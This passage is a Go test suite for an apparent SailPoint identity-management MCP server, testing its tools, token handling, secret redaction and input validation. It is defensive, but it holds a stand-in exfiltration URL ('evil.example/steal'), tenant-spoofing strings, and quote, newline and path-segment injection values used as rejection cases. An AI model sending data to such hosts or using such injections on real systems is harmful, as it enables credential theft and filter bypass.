package sailpoint

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"
	"github.com/rlwillen0121/identity-mcp/internal/authz"
	"github.com/rlwillen0121/identity-mcp/internal/idmcp"
)

func TestNewServerTools(t *testing.T) {
	c := NewClient(Config{ClientID: "c", ClientSecret: "s", BaseURL: "https://example.invalid", TokenURL: "https://example.invalid/oauth/token"})
	session := connect(t, NewServer(c))
	res, err := session.ListTools(context.Background(), nil)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{
		"list_identities", "get_identity", "get_identity_access", "list_accounts",
		"list_uncorrelated_accounts", "list_sources", "search", "find_stale_identities",
		"list_account_activities", "list_entitlements",
	}
	got := map[string]bool{}
	for _, tool := range res.Tools {
		got[tool.Name] = true
		ann := tool.Annotations
		if ann == nil || !ann.ReadOnlyHint || !ann.IdempotentHint ||
			ann.DestructiveHint == nil || *ann.DestructiveHint ||
			ann.OpenWorldHint == nil || !*ann.OpenWorldHint {
			t.Errorf("%s annotations = %#v", tool.Name, ann)
		}
	}
	for _, name := range want {
		if !got[name] {
			t.Errorf("missing tool %s", name)
		}
	}
	if len(res.Tools) != len(want) {
		t.Fatalf("tool count %d want %d", len(res.Tools), len(want))
	}
}

func TestListIdentitiesFetchesToken(t *testing.T) {
	var tokenCalls, idCalls atomic.Int32
	c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/oauth/token" {
			tokenCalls.Add(1)
			writeToken(t, w, r)
			return
		}
		if r.Header.Get("Authorization") != "Bearer tok" {
			t.Errorf("auth = %q", r.Header.Get("Authorization"))
		}
		if r.URL.Path != "/identities" {
			t.Errorf("path = %s", r.URL.Path)
		}
		if r.URL.Query().Get("defaultFilter") != "CORRELATED_ONLY" {
			t.Errorf("defaultFilter = %q", r.URL.Query().Get("defaultFilter"))
		}
		idCalls.Add(1)
		writeJSON(w, 200, `[{
			"id":"i1",
			"name":"Ada",
			"alias":"ada",
			"email":"ada@x",
			"identityState":"ACTIVE",
			"attributes":{"cloudLifecycleState":"active"}
		}]`)
	})

	out := callTool[idmcp.Page[IdentityItem]](t, c, "list_identities", ListIdentitiesInput{Limit: 10})
	if tokenCalls.Load() != 1 || idCalls.Load() != 1 {
		t.Fatalf("token=%d identities=%d", tokenCalls.Load(), idCalls.Load())
	}
	if len(out.Items) != 1 || out.Items[0].Email != "ada@x" || out.Items[0].CloudLifecycle != "active" {
		t.Fatalf("items = %#v", out.Items)
	}
	_ = callTool[idmcp.Page[IdentityItem]](t, c, "list_identities", ListIdentitiesInput{Limit: 10})
	if tokenCalls.Load() != 1 {
		t.Fatalf("token not cached: %d", tokenCalls.Load())
	}
}

func TestExpiredTokenRefreshes(t *testing.T) {
	var tokenCalls atomic.Int32
	c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/oauth/token" {
			tokenCalls.Add(1)
			writeToken(t, w, r)
			return
		}
		writeJSON(w, 200, `[]`)
	})
	_ = callTool[idmcp.Page[IdentityItem]](t, c, "list_identities", ListIdentitiesInput{})
	c.expiry = time.Now().Add(-time.Minute)
	_ = callTool[idmcp.Page[IdentityItem]](t, c, "list_identities", ListIdentitiesInput{})
	if tokenCalls.Load() != 2 {
		t.Fatalf("token calls = %d", tokenCalls.Load())
	}
}

func TestGetIdentityAccessHitsFourPaths(t *testing.T) {
	var paths []string
	c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/oauth/token" {
			writeToken(t, w, r)
			return
		}
		if r.Header.Get("Authorization") != "Bearer tok" {
			t.Errorf("auth = %q", r.Header.Get("Authorization"))
		}
		paths = append(paths, r.URL.Path)
		switch r.URL.Path {
		case "/identities/i1":
			writeJSON(w, 200, `{"id":"i1","name":"Ada","alias":"ada","email":"ada@x","identityState":"ACTIVE","attributes":{"cloudLifecycleState":"active"}}`)
		case "/accounts":
			if !strings.Contains(r.URL.Query().Get("filters"), `identityId eq "i1"`) {
				t.Errorf("filters = %q", r.URL.Query().Get("filters"))
			}
			if r.URL.Query().Get("detailLevel") != "SLIM" {
				t.Errorf("detailLevel = %q", r.URL.Query().Get("detailLevel"))
			}
			writeJSON(w, 200, `[{"id":"a1","name":"Ada AD","nativeIdentity":"ada","disabled":false,"uncorrelated":false,"sourceId":"s1","sourceName":"AD","identityId":"i1"}]`)
		case "/entitlements/identities/i1/entitlements":
			writeJSON(w, 200, `[{"id":"e1","name":"Domain Users","source":{"id":"s1","name":"AD"}}]`)
		case "/identities/i1/role-assignments":
			writeJSON(w, 200, `[{"id":"r1","role":{"id":"role1","name":"Admin"},"type":"ROLE"}]`)
		default:
			t.Errorf("unexpected path %s", r.URL.Path)
			writeJSON(w, 404, `{}`)
		}
	})
	out := callTool[IdentityAccess](t, c, "get_identity_access", GetIdentityAccessInput{IdentityID: "i1"})
	if out.ID != "i1" || out.Email != "ada@x" || out.CloudLifecycle != "active" {
		t.Fatalf("identity = %#v", out)
	}
	if len(out.Accounts) != 1 || out.Accounts[0].SourceName != "AD" || out.Accounts[0].NativeIdentity != "ada" {
		t.Fatalf("accounts = %#v", out.Accounts)
	}
	if len(out.Entitlements) != 1 || out.Entitlements[0].Name != "Domain Users" || out.Entitlements[0].Source != "AD" {
		t.Fatalf("entitlements = %#v", out.Entitlements)
	}
	if len(out.Roles) != 1 || out.Roles[0].Name != "Admin" || out.Roles[0].ID != "role1" {
		t.Fatalf("roles = %#v", out.Roles)
	}
	joined := strings.Join(paths, " ")
	for _, want := range []string{"/identities/i1", "/accounts", "/entitlements/identities/i1/entitlements", "/identities/i1/role-assignments"} {
		if !strings.Contains(joined, want) {
			t.Fatalf("missing path %s in %v", want, paths)
		}
	}
}

func TestSearchPostJSONPath(t *testing.T) {
	var method, path, ctype string
	var body []byte
	c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/oauth/token" {
			writeToken(t, w, r)
			return
		}
		method = r.Method
		path = r.URL.Path
		ctype = r.Header.Get("Content-Type")
		body, _ = io.ReadAll(r.Body)
		writeJSON(w, 200, `[{"id":"i1","name":"Ada","email":"ada@x","_type":"identity"}]`)
	})
	out := callTool[idmcp.Page[SearchHit]](t, c, "search", SearchInput{Query: "email:ada@x", Limit: 10})
	if method != http.MethodPost || path != "/search" {
		t.Fatalf("method=%s path=%s", method, path)
	}
	if ctype != "application/json" {
		t.Fatalf("content-type = %q", ctype)
	}
	if !strings.Contains(string(body), `"query"`) || !strings.Contains(string(body), "email:ada@x") {
		t.Fatalf("body = %s", body)
	}
	if !strings.Contains(string(body), `"sort":["id"]`) {
		t.Fatalf("body missing sort: %s", body)
	}
	if len(out.Items) != 1 || out.Items[0].Type != "identity" {
		t.Fatalf("items = %#v", out.Items)
	}
}

func TestPostJSONRefusesAbsolute(t *testing.T) {
	hit := false
	c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/oauth/token" {
			writeToken(t, w, r)
			return
		}
		hit = true
	})
	if err := c.ensureToken(context.Background()); err != nil {
		t.Fatal(err)
	}
	_, err := c.api.PostJSON(context.Background(), "https://evil.example/steal", map[string]any{"q": "x"}, nil)
	if err == nil {
		t.Fatal("expected error")
	}
	if hit {
		t.Fatal("must not fetch attacker URL")
	}
}

func TestListUncorrelatedAccountsFilter(t *testing.T) {
	var filters string
	c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/oauth/token" {
			writeToken(t, w, r)
			return
		}
		filters = r.URL.Query().Get("filters")
		writeJSON(w, 200, `[{"id":"a1","name":"orphan","nativeIdentity":"x","disabled":false,"uncorrelated":true,"sourceId":"s1","sourceName":"AD"}]`)
	})
	out := callTool[idmcp.Page[AccountItem]](t, c, "list_uncorrelated_accounts", ListAccountsInput{})
	if filters != "uncorrelated eq true" {
		t.Fatalf("filters = %q", filters)
	}
	if len(out.Items) != 1 || !out.Items[0].Uncorrelated {
		t.Fatalf("items = %#v", out.Items)
	}
}

func TestRetryAfterSurfaces(t *testing.T) {
	c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/oauth/token" {
			writeToken(t, w, r)
			return
		}
		w.Header().Set("Retry-After", "2")
		writeJSON(w, 429, `{"message":"rate limited"}`)
	})
	res := callToolRaw(t, c, "list_identities", ListIdentitiesInput{})
	if !res.IsError {
		t.Fatal("expected error")
	}
	msg := ""
	for _, part := range res.Content {
		b, _ := json.Marshal(part)
		msg += string(b)
	}
	if !strings.Contains(msg, "retry after 2") {
		t.Fatalf("error content = %s", msg)
	}
}

func TestFindStaleIdentitiesUncorrelatedSample(t *testing.T) {
	var accountFilters string
	accountCalls := 0
	c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/oauth/token" {
			writeToken(t, w, r)
			return
		}
		if r.Method == http.MethodPost && r.URL.Path == "/search" {
			writeJSON(w, 200, `[{"id":"i1","name":"Ada","email":"ada@x","identityState":"INACTIVE"}]`)
			return
		}
		if r.URL.Path == "/accounts" {
			accountCalls++
			accountFilters = r.URL.Query().Get("filters")
			writeJSON(w, 200, `[{"id":"a-orphan","name":"orphan","uncorrelated":true,"sourceId":"s1","sourceName":"AD"}]`)
			return
		}
		t.Errorf("unexpected path %s", r.URL.Path)
		writeJSON(w, 200, `[]`)
	})
	out := callTool[StalePage](t, c, "find_stale_identities", FindStaleIdentitiesInput{Limit: 50})
	if accountCalls != 1 {
		t.Fatalf("account calls = %d", accountCalls)
	}
	if accountFilters != "uncorrelated eq true" {
		t.Fatalf("filters = %q", accountFilters)
	}
	var gotUncorr bool
	for _, it := range out.Items {
		if it.ID == "a-orphan" && it.Uncorrelated && contains(it.Reasons, "uncorrelated") {
			gotUncorr = true
		}
	}
	if !gotUncorr {
		t.Fatalf("missing uncorrelated sample: %#v", out.Items)
	}
}

func contains(ss []string, want string) bool {
	for _, s := range ss {
		if s == want {
			return true
		}
	}
	return false
}

func TestFindStaleInspectCap(t *testing.T) {
	searchCalls := 0
	c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/oauth/token" {
			writeToken(t, w, r)
			return
		}
		if r.URL.Path == "/search" {
			searchCalls++
			writeJSON(w, 200, `[{"id":"s0","name":"S0"},{"id":"s1","name":"S1"},{"id":"s2","name":"S2"}]`)
			return
		}
		t.Errorf("unexpected path %s", r.URL.Path)
		writeJSON(w, 200, `[]`)
	})
	out := callTool[StalePage](t, c, "find_stale_identities", FindStaleIdentitiesInput{Limit: 2})
	if searchCalls != 1 {
		t.Fatalf("search calls = %d", searchCalls)
	}
	if !out.Truncated || out.Next != "" || out.Scanned != 3 || len(out.Items) != 2 {
		t.Fatalf("page = %#v", out)
	}
}

func TestEndpoints(t *testing.T) {
	base, token, err := Endpoints("acme", "", "")
	if err != nil {
		t.Fatal(err)
	}
	if base != "https://acme.api.identitynow.com/v2026" || token != "https://acme.api.identitynow.com/oauth/token" {
		t.Fatalf("derived = %s %s", base, token)
	}
	for _, bad := range []string{"evil.example/", "evil.example#", "evil.example?", ""} {
		if _, _, err := Endpoints(bad, "", ""); err == nil {
			t.Fatalf("accepted tenant %q", bad)
		}
	}
	base, token, err = Endpoints("", "https://override.example/v2026", "https://override.example/oauth/token")
	if err != nil {
		t.Fatal(err)
	}
	if base != "https://override.example/v2026" || token != "https://override.example/oauth/token" {
		t.Fatalf("override = %s %s", base, token)
	}
}

func TestTokenErrorScrubsSecret(t *testing.T) {
	const secret = "super-sailpoint-secret/with+chars"
	const access = "super-sailpoint-access-token"
	var calls atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/oauth/token" {
			http.NotFound(w, r)
			return
		}
		if calls.Add(1) == 1 {
			writeJSON(w, 200, `{"access_token":"`+access+`","expires_in":3600,"token_type":"Bearer"}`)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		_, _ = io.WriteString(w, "echo "+secret+" "+url.QueryEscape(secret)+" "+access)
	}))
	t.Cleanup(srv.Close)
	c := NewClient(Config{
		ClientID:     "cid",
		ClientSecret: secret,
		BaseURL:      srv.URL,
		TokenURL:     srv.URL + "/oauth/token",
		HTTP:         srv.Client(),
	})
	if err := c.ensureToken(context.Background()); err != nil {
		t.Fatal(err)
	}
	c.expiry = time.Now().Add(-time.Minute)
	err := c.ensureToken(context.Background())
	if err == nil {
		t.Fatal("expected error")
	}
	msg := err.Error()
	for _, leak := range []string{secret, url.QueryEscape(secret), access} {
		if strings.Contains(msg, leak) {
			t.Fatalf("error contains %q: %s", leak, msg)
		}
	}
}

func TestGetIdentityAccessTruncatesOversizedAccounts(t *testing.T) {
	var accounts strings.Builder
	accounts.WriteByte('[')
	for i := 0; i < 51; i++ {
		if i > 0 {
			accounts.WriteByte(',')
		}
		fmt.Fprintf(&accounts, `{"id":"a%d","name":"n%d","nativeIdentity":"n%d","disabled":false,"uncorrelated":false,"sourceId":"s1","sourceName":"AD","identityId":"i1"}`, i, i, i)
	}
	accounts.WriteByte(']')
	c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/oauth/token" {
			writeToken(t, w, r)
			return
		}
		switch r.URL.Path {
		case "/identities/i1":
			writeJSON(w, 200, `{"id":"i1","name":"Ada","alias":"ada","email":"ada@x","identityState":"ACTIVE","attributes":{"cloudLifecycleState":"active"}}`)
		case "/accounts":
			writeJSON(w, 200, accounts.String())
		case "/entitlements/identities/i1/entitlements", "/identities/i1/role-assignments":
			writeJSON(w, 200, `[]`)
		default:
			t.Errorf("unexpected path %s", r.URL.Path)
			writeJSON(w, 404, `{}`)
		}
	})
	out := callTool[IdentityAccess](t, c, "get_identity_access", GetIdentityAccessInput{IdentityID: "i1"})
	if len(out.Accounts) != 50 || !out.TruncatedAccounts {
		t.Fatalf("accounts=%d truncated=%v", len(out.Accounts), out.TruncatedAccounts)
	}
	if out.TruncatedEntitlements || out.TruncatedRoles {
		t.Fatalf("ent truncated=%v roles truncated=%v", out.TruncatedEntitlements, out.TruncatedRoles)
	}
}

func TestFindStaleOversizedPageStopsAtCap(t *testing.T) {
	const limit = 10
	const rows = 600
	var searchCalls atomic.Int32
	c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/oauth/token" {
			writeToken(t, w, r)
			return
		}
		if r.URL.Path != "/search" {
			t.Errorf("unexpected path %s", r.URL.Path)
			writeJSON(w, 200, `[]`)
			return
		}
		searchCalls.Add(1)
		body, _ := io.ReadAll(r.Body)
		if !strings.Contains(string(body), `"sort":["id"]`) {
			t.Errorf("search body missing sort: %s", body)
		}
		var b strings.Builder
		b.WriteByte('[')
		for i := 0; i < rows; i++ {
			if i > 0 {
				b.WriteByte(',')
			}
			fmt.Fprintf(&b, `{"id":"i%d","name":"N%d","identityState":"INACTIVE"}`, i, i)
		}
		b.WriteByte(']')
		writeJSON(w, 200, b.String())
	})
	out := callTool[StalePage](t, c, "find_stale_identities", FindStaleIdentitiesInput{Limit: limit})
	if searchCalls.Load() != 1 {
		t.Fatalf("search calls = %d", searchCalls.Load())
	}
	if out.Scanned > 500 || !out.Truncated || len(out.Items) > limit {
		t.Fatalf("page = %#v", out)
	}
	if out.Scanned != 500 || len(out.Items) != limit || out.Next != "0" {
		t.Fatalf("scanned=%d items=%d next=%q truncated=%v", out.Scanned, len(out.Items), out.Next, out.Truncated)
	}
}

func startFake(t *testing.T, h http.HandlerFunc) *Client {
	t.Helper()
	srv := httptest.NewServer(h)
	t.Cleanup(srv.Close)
	return NewClient(Config{
		ClientID:     "cid",
		ClientSecret: "sec",
		BaseURL:      srv.URL,
		TokenURL:     srv.URL + "/oauth/token",
		HTTP:         srv.Client(),
	})
}

func writeToken(t *testing.T, w http.ResponseWriter, r *http.Request) {
	t.Helper()
	if r.Method != http.MethodPost {
		t.Errorf("token method %s", r.Method)
	}
	body, _ := io.ReadAll(r.Body)
	form := string(body)
	for _, want := range []string{"grant_type=client_credentials", "client_id=cid", "client_secret=sec"} {
		if !strings.Contains(form, want) {
			t.Errorf("token body missing %q in %q", want, form)
		}
	}
	writeJSON(w, 200, `{"access_token":"tok","expires_in":3600,"token_type":"Bearer"}`)
}

func writeJSON(w http.ResponseWriter, status int, body string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	_, _ = io.WriteString(w, body)
}

func connect(t *testing.T, server *mcp.Server) *mcp.ClientSession {
	t.Helper()
	ctx := context.Background()
	t1, t2 := mcp.NewInMemoryTransports()
	if _, err := server.Connect(ctx, t1, nil); err != nil {
		t.Fatal(err)
	}
	client := mcp.NewClient(&mcp.Implementation{Name: "test", Version: "0"}, nil)
	session, err := client.Connect(ctx, t2, nil)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = session.Close() })
	return session
}

func callTool[Out any](t *testing.T, c *Client, name string, args any) Out {
	t.Helper()
	res := callToolRaw(t, c, name, args)
	if res.IsError {
		t.Fatalf("%s tool error: %v", name, res.Content)
	}
	b, err := json.Marshal(res.StructuredContent)
	if err != nil {
		t.Fatal(err)
	}
	var out Out
	if err := json.Unmarshal(b, &out); err != nil {
		t.Fatalf("decode %s: %v\n%s", name, err, b)
	}
	return out
}

func callToolRaw(t *testing.T, c *Client, name string, args any) *mcp.CallToolResult {
	t.Helper()
	session := connect(t, NewServer(c))
	res, err := session.CallTool(context.Background(), &mcp.CallToolParams{Name: name, Arguments: args})
	if err != nil {
		t.Fatal(err)
	}
	return res
}

func TestIdentityIDFilterRejectsInjection(t *testing.T) {
	for _, bad := range []string{`abc\"`, `abc\`, `abc'`, "abc\ndef", "abc\x00def"} {
		if _, err := identityIDFilter(bad); err == nil {
			t.Fatalf("expected identityIDFilter(%q) to fail", bad)
		}
	}
	got, err := identityIDFilter("2c91808568c529c60168cca6f90c1313")
	if err != nil || got != `identityId eq "2c91808568c529c60168cca6f90c1313"` {
		t.Fatalf("got %q err %v", got, err)
	}
}

func TestNewServerWithOptions(t *testing.T) {
	c := NewClient(Config{ClientID: "c", ClientSecret: "s", BaseURL: "https://example.invalid", TokenURL: "https://example.invalid/oauth/token"})

	// Default / writes disabled: 10 read-only tools
	sOff := NewServerWithOptions(c, false)
	sessionOff := connect(t, sOff)
	resOff, err := sessionOff.ListTools(context.Background(), nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(resOff.Tools) != 10 {
		t.Fatalf("disabled writes tool count %d, want 10", len(resOff.Tools))
	}
	for _, tool := range resOff.Tools {
		if tool.Name == "create_access_request" || tool.Name == "disable_account" {
			t.Fatalf("unexpected write tool %s when writes disabled", tool.Name)
		}
	}

	// Writes enabled: 12 tools (10 read-only + 2 write tools)
	sOn := NewServerWithOptions(c, true)
	sessionOn := connect(t, sOn)
	resOn, err := sessionOn.ListTools(context.Background(), nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(resOn.Tools) != 12 {
		t.Fatalf("enabled writes tool count %d, want 12", len(resOn.Tools))
	}

	toolMap := make(map[string]*mcp.Tool)
	for _, tool := range resOn.Tools {
		toolMap[tool.Name] = tool
	}

	// Verify create_access_request
	car, ok := toolMap["create_access_request"]
	if !ok {
		t.Fatal("missing create_access_request tool")
	}
	if car.Title != "Create access request" {
		t.Errorf("title = %q, want 'Create access request'", car.Title)
	}
	annCAR := car.Annotations
	if annCAR == nil {
		t.Fatal("nil annotations on create_access_request")
	}
	if annCAR.ReadOnlyHint {
		t.Error("create_access_request should not be read-only")
	}
	if annCAR.IdempotentHint {
		t.Error("create_access_request should not be idempotent")
	}
	if annCAR.DestructiveHint == nil || *annCAR.DestructiveHint {
		t.Error("create_access_request should not be destructive")
	}
	if annCAR.OpenWorldHint == nil || !*annCAR.OpenWorldHint {
		t.Error("create_access_request open world hint should be true")
	}

	// Verify disable_account
	da, ok := toolMap["disable_account"]
	if !ok {
		t.Fatal("missing disable_account tool")
	}
	if da.Title != "Disable account" {
		t.Errorf("title = %q, want 'Disable account'", da.Title)
	}
	annDA := da.Annotations
	if annDA == nil {
		t.Fatal("nil annotations on disable_account")
	}
	if annDA.ReadOnlyHint {
		t.Error("disable_account should not be read-only")
	}
	if !annDA.IdempotentHint {
		t.Error("disable_account should be idempotent")
	}
	if annDA.DestructiveHint == nil || !*annDA.DestructiveHint {
		t.Error("disable_account should be destructive")
	}
	if annDA.OpenWorldHint == nil || !*annDA.OpenWorldHint {
		t.Error("disable_account open world hint should be true")
	}
}

func TestCreateAccessRequest(t *testing.T) {
	t.Run("happy path with comment", func(t *testing.T) {
		var reqCalls atomic.Int32
		c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/oauth/token" {
				writeToken(t, w, r)
				return
			}
			if r.Method != http.MethodPost {
				t.Errorf("method = %s, want POST", r.Method)
			}
			if r.URL.Path != "/access-requests" {
				t.Errorf("path = %s, want /access-requests", r.URL.Path)
			}
			if r.Header.Get("Authorization") != "Bearer tok" {
				t.Errorf("auth = %q", r.Header.Get("Authorization"))
			}
			bodyBytes, err := io.ReadAll(r.Body)
			if err != nil {
				t.Fatal(err)
			}
			var payload rawCreateAccessRequestPayload
			if err := json.Unmarshal(bodyBytes, &payload); err != nil {
				t.Fatalf("unmarshal payload: %v", err)
			}
			if len(payload.RequestedFor) != 1 || payload.RequestedFor[0] != "id-123" {
				t.Errorf("requestedFor = %v, want ['id-123']", payload.RequestedFor)
			}
			if payload.RequestType != "GRANT_ACCESS" {
				t.Errorf("requestType = %q, want 'GRANT_ACCESS'", payload.RequestType)
			}
			if len(payload.RequestedItems) != 1 {
				t.Fatalf("requestedItems len = %d, want 1", len(payload.RequestedItems))
			}
			item := payload.RequestedItems[0]
			if item.Type != "ENTITLEMENT" || item.ID != "ent-456" || item.Comment != "need access for auditing" {
				t.Errorf("requestedItem = %#v", item)
			}
			reqCalls.Add(1)
			writeJSON(w, 200, `{"id":"req-001","status":"SUBMITTED"}`)
		})

		out := callWriteTool[CreateAccessRequestResult](t, c, "create_access_request", CreateAccessRequestInput{
			RequestedFor:  "id-123",
			EntitlementID: "ent-456",
			Comment:       "need access for auditing",
		})
		if reqCalls.Load() != 1 {
			t.Fatalf("expected 1 call to /access-requests, got %d", reqCalls.Load())
		}
		if out.RequestedFor != "id-123" || out.EntitlementID != "ent-456" || out.Status != "SUBMITTED" {
			t.Fatalf("unexpected result: %#v", out)
		}
	})

	t.Run("happy path status fallback", func(t *testing.T) {
		c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/oauth/token" {
				writeToken(t, w, r)
				return
			}
			writeJSON(w, 202, `{}`)
		})

		out := callWriteTool[CreateAccessRequestResult](t, c, "create_access_request", CreateAccessRequestInput{
			RequestedFor:  "id-999",
			EntitlementID: "ent-888",
		})
		if out.Status != "SUBMITTED" {
			t.Fatalf("expected default SUBMITTED status, got %q", out.Status)
		}
	})

	t.Run("happy path custom status", func(t *testing.T) {
		c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/oauth/token" {
				writeToken(t, w, r)
				return
			}
			writeJSON(w, 200, `{"status":"PENDING"}`)
		})

		out := callWriteTool[CreateAccessRequestResult](t, c, "create_access_request", CreateAccessRequestInput{
			RequestedFor:  "id-999",
			EntitlementID: "ent-888",
		})
		if out.Status != "PENDING" {
			t.Fatalf("expected PENDING status, got %q", out.Status)
		}
	})

	t.Run("validation errors", func(t *testing.T) {
		c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/oauth/token" {
				writeToken(t, w, r)
				return
			}
		})

		// Missing requested_for
		res1 := callWriteToolRaw(t, c, "create_access_request", CreateAccessRequestInput{
			EntitlementID: "ent-1",
		})
		if !res1.IsError {
			t.Fatal("expected error on missing requested_for")
		}

		// Missing entitlement_id
		res2 := callWriteToolRaw(t, c, "create_access_request", CreateAccessRequestInput{
			RequestedFor: "user-1",
		})
		if !res2.IsError {
			t.Fatal("expected error on missing entitlement_id")
		}

		// Invalid requested_for with control char
		res3 := callWriteToolRaw(t, c, "create_access_request", CreateAccessRequestInput{
			RequestedFor:  "user\n1",
			EntitlementID: "ent-1",
		})
		if !res3.IsError {
			t.Fatal("expected error on control char in requested_for")
		}
	})

	t.Run("server error redacts secret", func(t *testing.T) {
		c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/oauth/token" {
				writeToken(t, w, r)
				return
			}
			w.WriteHeader(http.StatusForbidden)
			_, _ = io.WriteString(w, `{"error":"forbidden with secret sec and token tok"}`)
		})

		res := callWriteToolRaw(t, c, "create_access_request", CreateAccessRequestInput{
			RequestedFor:  "id-1",
			EntitlementID: "ent-1",
		})
		if !res.IsError {
			t.Fatal("expected error on 403 Forbidden")
		}
		txt := resultText(res)
		if strings.Contains(txt, "sec") || strings.Contains(txt, "tok") {
			t.Fatalf("error leaked secret: %s", txt)
		}
	})
}

func TestDisableAccount(t *testing.T) {
	t.Run("happy path with taskId and status", func(t *testing.T) {
		var disableCalls atomic.Int32
		c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/oauth/token" {
				writeToken(t, w, r)
				return
			}
			if r.Method != http.MethodPost {
				t.Errorf("method = %s, want POST", r.Method)
			}
			if r.URL.Path != "/accounts/acc-001/disable" {
				t.Errorf("path = %s, want /accounts/acc-001/disable", r.URL.Path)
			}
			if r.Header.Get("Authorization") != "Bearer tok" {
				t.Errorf("auth = %q", r.Header.Get("Authorization"))
			}
			disableCalls.Add(1)
			writeJSON(w, 200, `{"taskId":"task-999","status":"QUEUED"}`)
		})

		out := callWriteTool[DisableAccountResult](t, c, "disable_account", DisableAccountInput{
			AccountID: "acc-001",
		})
		if disableCalls.Load() != 1 {
			t.Fatalf("expected 1 call, got %d", disableCalls.Load())
		}
		if out.AccountID != "acc-001" || out.TaskID != "task-999" || out.Status != "QUEUED" {
			t.Fatalf("unexpected result: %#v", out)
		}
	})

	t.Run("happy path with id field in response", func(t *testing.T) {
		c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/oauth/token" {
				writeToken(t, w, r)
				return
			}
			writeJSON(w, 200, `{"id":"task-555","status":"PENDING"}`)
		})

		out := callWriteTool[DisableAccountResult](t, c, "disable_account", DisableAccountInput{
			AccountID: "acc-002",
		})
		if out.TaskID != "task-555" || out.Status != "PENDING" {
			t.Fatalf("unexpected result: %#v", out)
		}
	})

	t.Run("happy path empty response body fallback", func(t *testing.T) {
		c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/oauth/token" {
				writeToken(t, w, r)
				return
			}
			writeJSON(w, 200, `{}`)
		})

		out := callWriteTool[DisableAccountResult](t, c, "disable_account", DisableAccountInput{
			AccountID: "acc-003",
		})
		if out.Status != "SUCCESS" || out.TaskID != "" {
			t.Fatalf("unexpected result: %#v", out)
		}
	})

	t.Run("validation errors", func(t *testing.T) {
		c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/oauth/token" {
				writeToken(t, w, r)
				return
			}
		})

		// Missing account_id
		res1 := callWriteToolRaw(t, c, "disable_account", DisableAccountInput{})
		if !res1.IsError {
			t.Fatal("expected error on missing account_id")
		}

		// Dot segment account_id
		res2 := callWriteToolRaw(t, c, "disable_account", DisableAccountInput{AccountID: ".."})
		if !res2.IsError {
			t.Fatal("expected error on dot-segment account_id")
		}

		// Control char in account_id
		res3 := callWriteToolRaw(t, c, "disable_account", DisableAccountInput{AccountID: "acc\x001"})
		if !res3.IsError {
			t.Fatal("expected error on control char in account_id")
		}
	})

	t.Run("upstream server error", func(t *testing.T) {
		c := startFake(t, func(w http.ResponseWriter, r *http.Request) {
			if r.URL.Path == "/oauth/token" {
				writeToken(t, w, r)
				return
			}
			w.WriteHeader(http.StatusNotFound)
			_, _ = io.WriteString(w, `{"error":"account not found"}`)
		})

		res := callWriteToolRaw(t, c, "disable_account", DisableAccountInput{AccountID: "nonexistent"})
		if !res.IsError {
			t.Fatal("expected error on 404")
		}
	})
}

func TestSailPointWritePolicyExampleValidates(t *testing.T) {
	pub1, _, _ := ed25519.GenerateKey(rand.Reader)
	pub2, _, _ := ed25519.GenerateKey(rand.Reader)
	pub3, _, _ := ed25519.GenerateKey(rand.Reader)
	pub4, _, _ := ed25519.GenerateKey(rand.Reader)
	uidReplacer := strings.NewReplacer(
		`"service_uid": 991`, `"service_uid": `+strconv.Itoa(os.Geteuid()),
		`"forbidden_uids": [501, 1000]`, `"forbidden_uids": [99998, 99999]`,
	)
	keyReplacer := strings.NewReplacer(
		"<64-hex-admin-ed25519-public-key>", hex.EncodeToString(pub1),
		"<64-hex-idp-ed25519-public-key>", hex.EncodeToString(pub2),
		"<64-hex-secops-lead-ed25519-public-key>", hex.EncodeToString(pub3),
		"<64-hex-iam-oncall-ed25519-public-key>", hex.EncodeToString(pub4),
	)
	absPath, err := filepath.Abs("../../examples/authz/sailpoint-write-policy.json")
	if err != nil {
		t.Fatal(err)
	}
	raw, err := os.ReadFile(absPath)
	if err != nil {
		t.Fatal(err)
	}
	uidAdjusted := []byte(uidReplacer.Replace(string(raw)))
	if _, err := authz.ParseAndValidatePolicyBytes("", uidAdjusted); err == nil || !strings.Contains(err.Error(), string(authz.ErrKnownTestKeyForbidden)) {
		t.Fatalf("expected KNOWN_TEST_KEY_FORBIDDEN on placeholder sailpoint-write-policy.json, got %v", err)
	}
	populated := []byte(keyReplacer.Replace(string(uidAdjusted)))
	pol, err := authz.ParseAndValidatePolicyBytes("", populated)
